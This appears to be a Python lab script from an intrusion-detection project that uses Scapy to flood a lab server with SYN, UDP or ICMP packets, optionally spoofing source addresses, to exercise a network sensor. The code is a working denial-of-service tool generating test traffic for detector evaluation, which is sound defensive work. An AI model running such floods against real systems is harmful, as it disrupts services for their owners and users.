"""SYN / UDP / ICMP flood against the lab server (owner: Bhavya).

A high packet rate from one source (or spoofed sources) to one host. The H
(per-source) features catch the volume; spoofed sources also stress the stream
table, which is why pruning exists.

    sudo python3 lab/attacks/dosflood.py --target 10.10.0.10 --mode syn --rate 5000 --duration 20
    sudo python3 lab/attacks/dosflood.py --target 10.10.0.10 --mode syn --spoof --rate 5000 --duration 20

Keep rate and duration modest in the demo so the sensor is not overwhelmed; log
the sensor's kernel drop count alongside each run (see lab/README.md).
"""

from __future__ import annotations

import argparse
import random
import time

from attack_base import AttackRun


def rand_ip():
    return f"10.10.0.{random.randint(2, 254)}"


def flood(args, run):
    from scapy.all import ICMP, IP, TCP, UDP, RandShort, send  # noqa: N811
    delay = 1.0 / args.rate if args.rate else 0.0
    end = time.time() + args.duration
    while time.time() < end:
        src = rand_ip() if args.spoof else None
        ip = IP(dst=args.target, src=src) if src else IP(dst=args.target)
        if args.mode == "syn":
            pkt = ip / TCP(sport=RandShort(), dport=args.port, flags="S")
        elif args.mode == "udp":
            pkt = ip / UDP(sport=RandShort(), dport=args.port) / (b"x" * 64)
        else:  # icmp
            pkt = ip / ICMP()
        send(pkt, verbose=0)
        run.sent += 1
        if delay:
            time.sleep(delay)


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--mode", choices=["syn", "udp", "icmp"], default="syn")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--rate", type=float, default=2000, help="packets per second")
    ap.add_argument("--duration", type=float, default=20)
    ap.add_argument("--spoof", action="store_true", help="random source IPs")
    args = ap.parse_args(argv)
    variant = f"{args.mode}{'-spoof' if args.spoof else ''}"
    with AttackRun("dosflood", variant, target=args.target, rate=args.rate,
                   note=f"port {args.port}") as run:
        flood(args, run)


if __name__ == "__main__":
    main()
